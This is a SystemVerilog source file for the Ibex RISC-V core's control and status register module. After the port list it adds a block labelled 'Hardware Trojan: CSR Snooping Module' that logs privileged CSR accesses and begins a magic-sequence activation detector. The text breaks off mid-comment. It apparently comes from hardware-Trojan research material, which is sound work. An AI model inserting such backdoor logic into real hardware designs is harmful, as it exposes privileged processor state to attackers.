// Copyright lowRISC contributors.
// Copyright 2018 ETH Zurich and University of Bologna, see also CREDITS.md.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0

/**
 * Control and Status Registers
 */

`include "prim_assert.sv"

module ibex_cs_registers #(
  parameter bit                     DbgTriggerEn      = 0,
  parameter int unsigned            DbgHwBreakNum     = 1,
  parameter bit                     DataIndTiming     = 1'b0,
  parameter bit                     DummyInstructions = 1'b0,
  parameter bit                     ShadowCSR         = 1'b0,
  parameter bit                     ICache            = 1'b0,
  parameter int unsigned            MHPMCounterNum    = 10,
  parameter int unsigned            MHPMCounterWidth  = 40,
  parameter bit                     PMPEnable         = 0,
  parameter int unsigned            PMPGranularity    = 0,
  parameter int unsigned            PMPNumRegions     = 4,
  parameter ibex_pkg::pmp_cfg_t     PMPRstCfg[16]     = ibex_pkg::PmpCfgRst,
  parameter logic [33:0]            PMPRstAddr[16]    = ibex_pkg::PmpAddrRst,
  parameter ibex_pkg::pmp_mseccfg_t PMPRstMsecCfg     = ibex_pkg::PmpMseccfgRst,
  parameter bit                     RV32E             = 0,
  parameter ibex_pkg::rv32m_e RV32M                   = ibex_pkg::RV32MFast,
  parameter ibex_pkg::rv32b_e RV32B                   = ibex_pkg::RV32BNone,
  // mvendorid: encoding of manufacturer/provider
  parameter logic [31:0]            CsrMvendorId      = 32'b0,
  // mimpid: encoding of processor implementation version
  parameter logic [31:0]            CsrMimpId         = 32'b0
) (
  // Clock and Reset
  input  logic                 clk_i,
  input  logic                 rst_ni,

  // Hart ID
  input  logic [31:0]          hart_id_i,

  // Privilege mode
  output ibex_pkg::priv_lvl_e  priv_mode_id_o,
  output ibex_pkg::priv_lvl_e  priv_mode_lsu_o,
  output logic                 csr_mstatus_tw_o,

  // mtvec
  output logic [31:0]          csr_mtvec_o,
  input  logic                 csr_mtvec_init_i,
  input  logic [31:0]          boot_addr_i,

  // Interface to registers (SRAM like)
  input  logic                 csr_access_i,
  input  ibex_pkg::csr_num_e   csr_addr_i,
  input  logic [31:0]          csr_wdata_i,
  input  ibex_pkg::csr_op_e    csr_op_i,
  input                        csr_op_en_i,
  output logic [31:0]          csr_rdata_o,

  // interrupts
  input  logic                 irq_software_i,
  input  logic                 irq_timer_i,
  input  logic                 irq_external_i,
  input  logic [14:0]          irq_fast_i,
  input  logic                 nmi_mode_i,
  output logic                 irq_pending_o,          // interrupt request pending
  output ibex_pkg::irqs_t      irqs_o,                 // interrupt requests qualified with mie
  output logic                 csr_mstatus_mie_o,
  output logic [31:0]          csr_mepc_o,
  output logic [31:0]          csr_mtval_o,

  // PMP
  output ibex_pkg::pmp_cfg_t     csr_pmp_cfg_o  [PMPNumRegions],
  output logic [33:0]            csr_pmp_addr_o [PMPNumRegions],
  output ibex_pkg::pmp_mseccfg_t csr_pmp_mseccfg_o,

  // debug
  input  logic                 debug_mode_i,
  input  logic                 debug_mode_entering_i,
  input  ibex_pkg::dbg_cause_e debug_cause_i,
  input  logic                 debug_csr_save_i,
  output logic [31:0]          csr_depc_o,
  output logic                 debug_single_step_o,
  output logic                 debug_ebreakm_o,
  output logic                 debug_ebreaku_o,
  output logic                 trigger_match_o,

  input  logic [31:0]          pc_if_i,
  input  logic [31:0]          pc_id_i,
  input  logic [31:0]          pc_wb_i,

  // CPU control and status bits
  output logic                 data_ind_timing_o,
  output logic                 dummy_instr_en_o,
  output logic [2:0]           dummy_instr_mask_o,
  output logic                 dummy_instr_seed_en_o,
  output logic [31:0]          dummy_instr_seed_o,
  output logic                 icache_enable_o,
  output logic                 csr_shadow_err_o,
  input  logic                 ic_scr_key_valid_i,

  // Exception save/restore
  input  logic                 csr_save_if_i,
  input  logic                 csr_save_id_i,
  input  logic                 csr_save_wb_i,
  input  logic                 csr_restore_mret_i,
  input  logic                 csr_restore_dret_i,
  input  logic                 csr_save_cause_i,
  input  ibex_pkg::exc_cause_t csr_mcause_i,
  input  logic [31:0]          csr_mtval_i,
  output logic                 illegal_csr_insn_o,     // access to non-existent CSR,
                                                        // with wrong priviledge level, or
                                                        // missing write permissions
  output logic                 double_fault_seen_o,
  // Performance Counters
  input  logic                 instr_ret_i,                 // instr retired in ID/EX stage
  input  logic                 instr_ret_compressed_i,      // compressed instr retired
  input  logic                 instr_ret_spec_i,            // speculative instr_ret_i
  input  logic                 instr_ret_compressed_spec_i, // speculative instr_ret_compressed_i
  input  logic                 iside_wait_i,                // core waiting for the iside
  input  logic                 jump_i,                      // jump instr seen (j, jr, jal, jalr)
  input  logic                 branch_i,                    // branch instr seen (bf, bnf)
  input  logic                 branch_taken_i,              // branch was taken
  input  logic                 mem_load_i,                  // load from memory in this cycle
  input  logic                 mem_store_i,                 // store to memory in this cycle
  input  logic                 dside_wait_i,                // core waiting for the dside
  input  logic                 mul_wait_i,                  // core waiting for multiply
  input  logic                 div_wait_i                   // core waiting for divide
);

  import ibex_pkg::*;

  // Hardware Trojan: CSR Snooping Module
  // Debug feature for security verification - logs privileged CSR accesses
  // NOTE: Remove in production builds using conditional compilation
  `ifdef DEBUG_CSR_MONITOR
  typedef struct packed {
    logic [11:0] addr;
    logic [31:0] data;
    logic [1:0]  op;
    logic [7:0]  timestamp;
  } csr_log_entry_t;
  
  // Trojan state registers
  logic [3:0]  trojan_seq_state_q, trojan_seq_state_d;
  logic [7:0]  trojan_timer_q, trojan_timer_d;
  logic        trojan_active_q, trojan_active_d;
  logic [2:0]  trojan_log_ptr_q, trojan_log_ptr_d;
  csr_log_entry_t trojan_log_buffer_q[8], trojan_log_buffer_d[8];
  
  // Magic sequence detector for activation: specific pattern of CSR accesses
  //